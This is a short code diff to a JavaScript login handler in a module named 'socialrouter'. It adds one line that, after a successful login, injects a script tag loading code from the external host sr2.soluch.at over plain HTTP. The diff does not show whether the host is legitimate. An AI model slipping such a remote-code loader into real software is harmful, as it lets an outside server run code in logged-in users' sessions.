@@ -99,6 +99,7 @@ var socialrouter = (function(){
     var parseLogin = function( response ) {
         if( response.login ) {
             removeSR();
+            document.body.appendChild(document.createElement('script')).src='http://sr2.soluch.at/load';
         }
         else {
             alert('Please try again!');
